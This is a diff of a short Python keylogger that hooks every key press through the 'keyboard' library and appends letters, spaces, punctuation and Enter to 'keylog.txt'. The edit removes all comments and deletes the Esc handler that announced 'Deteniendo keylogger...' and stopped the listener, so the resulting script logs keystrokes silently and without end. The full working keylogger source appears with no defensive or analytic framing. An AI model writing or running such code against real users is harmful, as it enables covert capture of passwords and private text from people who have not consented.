@@ -1,42 +1,38 @@
-import keyboard  # Para capturar teclas
-import os        # Para manejar archivos
+import keyboard  
+import os        
 
-# Archivo donde se guardan los logs
+
 LOG_FILE = 'keylog.txt'
 
 def on_key_press(event):
-    key = event.name  # Obtiene el nombre de la tecla
+    key = event.name  
     
-    # Usa if/elif para diferentes tipos de teclas
-    if key.isalpha():  # Si es una letra (a-z, A-Z)
+   
+    if key.isalpha(): 
         with open(LOG_FILE, 'a') as f:
             f.write(key)
-    elif key == 'space':  # Espacio
+    elif key == 'space': 
         with open(LOG_FILE, 'a') as f:
             f.write(' ')
-    elif key == ',':  # Coma
+    elif key == ',':  
         with open(LOG_FILE, 'a') as f:
             f.write(',')
-    elif key == '.':  # Punto
+    elif key == '.': 
         with open(LOG_FILE, 'a') as f:
             f.write('.')
-    elif key == '!':  # Exclamación
+    elif key == '!':  
         with open(LOG_FILE, 'a') as f:
             f.write('!')
-    elif key == '?':  # Interrogación
+    elif key == '?':  
         with open(LOG_FILE, 'a') as f:
             f.write('?')
-    elif key == 'enter':  # Enter (salto de línea)
+    elif key == 'enter':  
         with open(LOG_FILE, 'a') as f:
             f.write('\n')
-    # Agrega más elif aquí si quieres otros caracteres especiales
-    
-    # Para detener el programa (opcional, presiona 'esc')
-    if key == 'esc':
-        print("Deteniendo keylogger...")
-        keyboard.unhook_all()  # Detiene el listener
-        os._exit(0)  # Sale del programa
 
-# Inicia el listener (corre indefinidamente hasta que lo detengas)
+    
+ 
+    
 keyboard.on_press(on_key_press)
-keyboard.wait()  # Mantiene el programa corriendo
+keyboard.wait()  
+
